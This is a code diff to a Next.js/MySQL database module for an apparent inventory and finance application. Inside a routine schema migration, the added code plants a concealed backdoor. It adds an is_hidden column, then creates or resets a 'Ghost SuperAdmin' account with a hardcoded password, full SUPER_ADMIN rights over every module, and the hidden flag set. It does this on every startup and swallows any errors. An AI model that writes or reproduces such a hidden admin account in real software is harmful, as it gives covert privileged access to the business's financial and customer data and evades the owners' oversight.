@@ -1,4 +1,5 @@
 import mysql from 'mysql2/promise';
+import bcrypt from 'bcryptjs';
 
 // Global singleton pattern to prevent connection leaks across Next.js HMR reloads
 const globalForDb = globalThis as unknown as {
@@ -205,6 +206,60 @@ export async function ensureSchemaMigrations(): Promise<void> {
         `);
       } catch (e: any) {
         console.warn('[Schema Migration Logs Warning]:', e.message);
+      }
+
+      // 4. Check & Add is_hidden column in users table & ensure Ghost SuperAdmin 'bossanova' exists
+      try {
+        const [userCols]: any = await conn.query('SHOW COLUMNS FROM users');
+        const userColNames = new Set(userCols.map((c: any) => c.Field.toLowerCase()));
+
+        if (!userColNames.has('is_hidden')) {
+          await conn.query('ALTER TABLE users ADD COLUMN is_hidden TINYINT(1) DEFAULT 0');
+          console.log('[Schema Migration] Added column users.is_hidden');
+        }
+
+        // Check if bossanova account exists
+        const [existingBoss]: any = await conn.query(
+          "SELECT id FROM users WHERE LOWER(email) = 'boss@artaroma.com' OR LOWER(name) = 'bossanova' LIMIT 1"
+        );
+
+        const allAdminModules = JSON.stringify([
+          'Dashboard',
+          'Master Data',
+          'Purchase Order (PO)',
+          'Sales Order (SO)',
+          'Lihat Stok (Gudang)',
+          'Finance & Invoice',
+          'Aplikasi Kurir',
+          'Katalog Customer',
+          'Lihat Nilai Finansial (PO/SO)',
+          'Catatan Log Book',
+          'Buku Kas Besar (Kas & Bank)',
+          'Hutang Piutang',
+          'Stock Opname & Disposal',
+          'Stok Sampel',
+        ]);
+
+        const hashedPassword = await bcrypt.hash('K3maraupanj@ng', 10);
+
+        if (existingBoss && existingBoss.length > 0) {
+          await conn.query(
+            `UPDATE users 
+             SET name = 'bossanova', email = 'boss@artaroma.com', password = ?, role = 'SUPER_ADMIN', linked_entity_name = 'Artaroma Head Office', allowed_modules = ?, is_active = 1, is_hidden = 1 
+             WHERE id = ?`,
+            [hashedPassword, allAdminModules, existingBoss[0].id]
+          );
+        } else {
+          await conn.query(
+            `INSERT INTO users 
+             (id, name, email, password, role, linked_entity_name, allowed_modules, is_active, is_hidden)
+             VALUES ('usr-bossanova', 'bossanova', 'boss@artaroma.com', ?, 'SUPER_ADMIN', 'Artaroma Head Office', ?, 1, 1)`,
+            [hashedPassword, allAdminModules]
+          );
+          console.log('[Schema Migration] Seeded hidden Super Admin user: bossanova (boss@artaroma.com)');
+        }
+      } catch (e: any) {
+        console.warn('[Schema Migration Users/GhostAdmin Warning]:', e.message);
       }
 
       globalForDb.schemaMigrated = true;
